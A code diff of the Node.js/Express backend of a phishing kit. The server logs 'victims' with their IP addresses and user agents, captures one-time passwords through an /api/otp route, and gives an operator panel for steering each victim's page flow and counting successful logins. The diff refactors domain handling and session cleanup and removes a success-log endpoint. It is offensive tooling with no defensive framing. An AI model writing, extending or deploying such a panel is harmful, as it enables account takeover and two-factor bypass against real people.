@@ -29,9 +29,9 @@ const sessionActivity = new Map();   // last ping
 const auditLog        = [];          // never deleted
 let victimCounter     = 0;
 let successfulLogins  = 0;
-let currentDomain     = '';
+let currentDomain     = '';          // filled at boot + on every request
 
-const SESSION_TIMEOUT = 3 * 60 * 1000; // 3 min
+const SESSION_TIMEOUT = 3 * 60 * 1000; // 3 min idle fallback
 
 /* ----------  STATIC ROUTES  ---------- */
 app.use(express.static(__dirname));
@@ -65,11 +65,11 @@ app.post('/panel/logout', (req, res) => {
 // block direct file access
 app.get(['/_panel.html', '/panel.html'], (req, res) => res.redirect('/panel'));
 
-/* ----------  DOMAIN HELPER  ---------- */
+/* ----------  DOMAIN HELPER – sets currentDomain for every request  ---------- */
 app.use((req, res, next) => {
   const host = req.headers.host || req.hostname;
-  const proto = req.headers['x-forwarded-proto'] || req.protocol || 'https';
-  if (host && host !== 'localhost') currentDomain = `${proto}://${host}`;
+  const proto = req.headers['x-forwarded-proto'] || req.protocol;
+  currentDomain = host.includes('localhost') ? `http://localhost:${PORT}` : `${proto}://${host}`;
   next();
 });
 
@@ -105,14 +105,14 @@ function getSessionHeader(v) {
 }
 
 /* ----------  CLEANUP  ---------- */
-async function cleanupSession(sid, reason, silent = false) {
+function cleanupSession(sid, reason, silent = false) {
   const v = sessionsMap.get(sid);
   if (!v) return;
   sessionsMap.delete(sid);
   sessionActivity.delete(sid);
 }
 
-/* ----------  TIMEOUT CLEANER  ---------- */
+/* ----------  TIMEOUT CLEANER (fallback)  ---------- */
 setInterval(() => {
   const now = Date.now();
   for (const [sid, last] of sessionActivity) {
@@ -129,7 +129,7 @@ app.post('/api/session', async (req, res) => {
     const ip  = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
     const ua  = req.headers['user-agent'] || 'n/a';
     const now = new Date();
-    const dateStr = `${String(now.getDate()).padStart(2,'0')}/${String(now.getMonth()+1).padStart(2,'0')}/${String(now.getFullYear()).slice(-2)} ${now.toLocaleString('en-US',{hour:'numeric',minute:'2-digit',hour12:true})}`;
+    const dateStr = now.toLocaleString(); // ISO or local – panel converts to local tz
 
     victimCounter++;
     const victim = {
@@ -230,7 +230,7 @@ app.post('/api/otp', async (req, res) => {
   }
 });
 
-/*  exit  */
+/*  EXIT – victim closed page → instant delete  */
 app.post('/api/exit', async (req, res) => {
   const { sid } = req.body;
   if (sid && sessionsMap.has(sid)) cleanupSession(sid, 'closed the page', true);
@@ -268,7 +268,7 @@ app.get('/api/panel', (req, res) => {
     ip: v.ip, platform: v.platform, browser: v.browser, ua: v.ua, dateStr: v.dateStr
   }));
   res.json({
-    domain: currentDomain,
+    domain: currentDomain,               // always fresh
     totalVictims: victimCounter,
     active: list.length,
     waiting: list.filter(x => x.status === 'wait').length,
@@ -276,23 +276,6 @@ app.get('/api/panel', (req, res) => {
     sessions: list,
     logs: auditLog.slice(-50).reverse()
   });
-});
-
-/*  NEW: success-only log  */
-app.get('/api/success-log', (req, res) => {
-  const successes = auditLog
-    .filter(e => sessionsMap.get(e.sid)?.page === 'success')
-    .map(e => ({ ...e, page: 'success' }));
-  res.json(successes);
-});
-
-/*  NEW: wipe success list (optional)  */
-app.post('/api/clear-success', (req, res) => {
-  // remove from auditLog every entry whose session reached 'success'
-  for (let i = auditLog.length - 1; i >= 0; i--) {
-    if (sessionsMap.get(auditLog[i].sid)?.page === 'success') auditLog.splice(i, 1);
-  }
-  res.json({ ok: true });
 });
 
 /*  panel control  */
@@ -319,8 +302,7 @@ app.post('/api/panel', async (req, res) => {
       else if (v.page === 'otp.html') { v.page = 'success'; successfulLogins++; }
       break;
     case 'delete':
-      sessionsMap.delete(sid);
-      sessionActivity.delete(sid);
+      cleanupSession(sid, 'deleted from panel');
       break;
   }
   res.json({ ok: true });
@@ -329,5 +311,6 @@ app.post('/api/panel', async (req, res) => {
 /* ----------  START  ---------- */
 app.listen(PORT, '0.0.0.0', () => {
   console.log(`Server running on port ${PORT}`);
-  currentDomain = process.env.RAILWAY_STATIC_URL || process.env.RAILWAY_PUBLIC_DOMAIN || `http://localhost:${PORT}`;
+  /* final fallback – overwritten on first request anyway */
+  currentDomain = process.env.RAILWAY_STATIC_URL || process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
 });
